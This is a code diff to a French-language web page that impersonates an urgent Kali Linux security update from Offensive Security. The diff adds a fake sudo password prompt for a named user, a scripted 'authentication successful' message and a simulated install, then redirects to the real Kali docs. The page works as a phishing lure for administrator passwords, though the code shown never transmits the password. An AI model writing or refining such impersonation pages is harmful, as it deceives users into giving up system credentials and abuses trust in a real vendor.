@@ -138,6 +138,41 @@
         .terminal-line {
             white-space: pre-wrap;
         }
+        .password-prompt {
+            background: #0d0f14;
+            border: 1px solid #3a4458;
+            border-radius: 6px;
+            padding: 16px;
+            margin: 18px 0;
+        }
+        .password-prompt label {
+            display: block;
+            margin-bottom: 8px;
+            color: #64d2ff;
+            font-size: 0.9rem;
+        }
+        .password-prompt input {
+            width: 100%;
+            padding: 10px;
+            background: #050607;
+            border: 1px solid #2e3648;
+            border-radius: 4px;
+            color: #e9e9e9;
+            font-family: "JetBrains Mono", monospace;
+            font-size: 0.95rem;
+        }
+        .password-prompt input:focus {
+            outline: none;
+            border-color: #64d2ff;
+        }
+        .password-prompt .hint {
+            margin-top: 8px;
+            font-size: 0.8rem;
+            color: #7a819a;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -158,11 +193,16 @@
             Cette mise à jour contient un correctif publié par l’équipe Offensive Security.
             L’installation doit être effectuée immédiatement pour continuer à utiliser les dépôts Kali.
         </p>
+        <div id="password-section" class="password-prompt">
+            <label for="sudo-password">Mot de passe administrateur requis:</label>
+            <input type="password" id="sudo-password" placeholder="[sudo] Mot de passe pour sira:" autofocus>
+            <div class="hint">Cette opération nécessite les privilèges root pour installer le correctif de sécurité.</div>
+        </div>
         <div class="progress-bar" aria-hidden="true">
             <span id="progress"></span>
         </div>
-        <div class="terminal" id="terminal" aria-live="polite" aria-label="Sortie du terminal">
-            <div class="terminal-line">[INFO] En attente de confirmation utilisateur…</div>
+        <div class="terminal hidden" id="terminal" aria-live="polite" aria-label="Sortie du terminal">
+            <div class="terminal-line">[INFO] Authentification en cours…</div>
         </div>
         <div class="action-area">
             <button id="btn-cancel">Annuler</button>
@@ -207,6 +247,8 @@
         const btnInstall = document.getElementById("btn-install");
         const terminal = document.getElementById("terminal");
         const progressBar = document.getElementById("progress");
+        const passwordInput = document.getElementById("sudo-password");
+        const passwordSection = document.getElementById("password-section");
         let running = false;
         let lineIndex = 0;
 
@@ -220,25 +262,50 @@
 
         function simulateInstall() {
             if (running) return;
+            
+            // Vérifier que le mot de passe a été saisi
+            const password = passwordInput.value.trim();
+            if (!password) {
+                passwordInput.style.borderColor = "#ff4f6d";
+                passwordInput.focus();
+                return;
+            }
+            
             running = true;
             btnInstall.disabled = true;
             btnInstall.textContent = "Installation en cours…";
-            appendLine("Authentification sudo requise…");
-
-            const interval = setInterval(() => {
-                if (lineIndex >= lines.length) {
-                    clearInterval(interval);
-                    progressBar.style.width = "100%";
-                    setTimeout(() => {
-                        window.location.href = "https://www.kali.org/docs/";
-                    }, 1200);
-                    return;
-                }
-                appendLine(lines[lineIndex]);
-                progressBar.style.width = `${Math.min(100, ((lineIndex + 1) / lines.length) * 100)}%`;
-                lineIndex++;
-            }, 800);
+            
+            // Masquer la section mot de passe et afficher le terminal
+            passwordSection.classList.add("hidden");
+            terminal.classList.remove("hidden");
+            
+            appendLine(`[sudo] Mot de passe pour ${passwordInput.placeholder.split(':')[0].replace('[sudo] ', '')}:`);
+            appendLine("Authentification réussie.");
+            appendLine("Démarrage de l'installation du correctif...");
+            
+            setTimeout(() => {
+                const interval = setInterval(() => {
+                    if (lineIndex >= lines.length) {
+                        clearInterval(interval);
+                        progressBar.style.width = "100%";
+                        setTimeout(() => {
+                            window.location.href = "https://www.kali.org/docs/";
+                        }, 1200);
+                        return;
+                    }
+                    appendLine(lines[lineIndex]);
+                    progressBar.style.width = `${Math.min(100, ((lineIndex + 1) / lines.length) * 100)}%`;
+                    lineIndex++;
+                }, 800);
+            }, 1000);
         }
+
+        // Permettre de lancer l'installation avec Enter dans le champ mot de passe
+        passwordInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter" && !running) {
+                simulateInstall();
+            }
+        });
 
         btnInstall.addEventListener("click", simulateInstall);
         document.addEventListener("keydown", (e) => {
